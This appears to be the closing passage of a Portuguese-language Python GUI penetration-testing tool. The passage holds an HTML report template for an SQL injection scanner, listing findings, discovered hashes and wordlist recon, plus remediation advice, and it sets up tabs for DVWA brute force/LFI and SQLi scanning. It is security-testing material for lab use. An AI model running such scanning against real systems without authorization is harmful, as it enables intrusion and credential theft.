 body{{font-family:Consolas,monospace;background:#050805;color:#00ff41;padding:25px}}
 main{{max-width:1250px;margin:auto}}
 header{{background:#0b120b;border:1px solid #00ff41;padding:25px;border-radius:10px}}
 .stat{{display:inline-block;background:#0b120b;border:1px solid #00b32d;padding:18px;margin:10px 5px;border-radius:8px}}
 table{{width:100%;border-collapse:collapse;background:#0b120b}}
 th{{background:#003b00;color:#00ff41;padding:9px}}
 td{{padding:8px;border-bottom:1px solid #004d00;vertical-align:top}}
 code{{background:#001100;padding:3px;word-break:break-all}}
 .card{{background:#0b120b;margin:15px 0;padding:18px;border-left:5px solid #00ff41;border-radius:8px}}
 .pwd{{color:#ff7518;font-weight:bold}}
 footer{{margin-top:20px;color:#00b32d;font-size:12px}}
</style>
</head>
<body>
<main>
 <header>
  <h1>&#128737; Relatório de SQL Injection</h1>
  <p><b>Alvo:</b> {html.escape(self.url.get())}</p>
  <p>Gerado em: {datetime.now():%d/%m/%Y %H:%M}</p>
 </header>
 <div class="stat"><b>{len(self.findings)}</b><br>Achados SQLi</div>
 <div class="stat"><b>{len(self.results)}</b><br>Testes</div>
 <div class="stat"><b>{len(self.hash_findings)}</b><br>Hashes</div>
 <div class="stat"><b>{len(self.recon_findings)}</b><br>Recursos</div>

 <h2>&#128270; Evidências SQLi</h2>
 {findings or "<p>Nenhum achado confirmado.</p>"}

 <h2>&#128273; Hashes Encontrados</h2>
 {hashes or "<p>Nenhum hash encontrado.</p>"}

 <h2>&#128193; Recon (Wordlist)</h2>
 <table>
  <tr><th>Recurso</th><th>Status</th><th>Bytes</th><th>Tempo</th><th>URL</th></tr>
  {recon or "<tr><td colspan=5>Nenhum recurso encontrado.</td></tr>"}
 </table>

 <h2>&#128203; Todos os testes</h2>
 <table>
  <tr><th>Parâmetro</th><th>Payload</th><th>Técnica</th><th>Status</th>
      <th>Bytes</th><th>Tempo</th><th>Resultado</th><th>Evidência</th></tr>
  {rows}
 </table>

 <h2>&#128274; Recomendações</h2>
 <ul>
  <li>Use queries parametrizadas/prepared statements.</li>
  <li>Valide os tipos e formatos das entradas.</li>
  <li>Use princípio do menor privilégio no banco.</li>
  <li>Não exponha erros SQL ao usuário.</li>
  <li>Use hashes fortes com salt (bcrypt/argon2) e nunca MD5/SHA-1 para senhas.</li>
  <li>Use WAF como camada complementar, não como substituto.</li>
 </ul>
 <footer>SQLi Scanner — somente para testes autorizados</footer>
</main>
</body>
</html>"""

        try:
            with open(filename, "w", encoding="utf-8") as fh:
                fh.write(doc)
            self.write(f"[+] Relatório salvo: {filename}")
            webbrowser.open(filename)
        except OSError as e:
            self.write(f"[ERRO] Salvando relatório: {e}")


# ####################################################################
# MAIN
# ####################################################################
def main():
    root = tk.Tk()
    root.title("Hacker Toolkit  ::  DVWA BF/LFI + SQLi Scanner")
    root.geometry("1150x820")
    root.minsize(900, 640)
    apply_theme(root)

    notebook = ttk.Notebook(root)
    notebook.pack(fill="both", expand=True, padx=8, pady=8)

    tab1 = DvwaTab(notebook)
    tab2 = SqliTab(notebook)

    notebook.add(tab1, text="  DVWA Brute Force + LFI  ")
    notebook.add(tab2, text="  SQLi Scanner  ")

    root.mainloop()


if __name__ == "__main__":
    main()
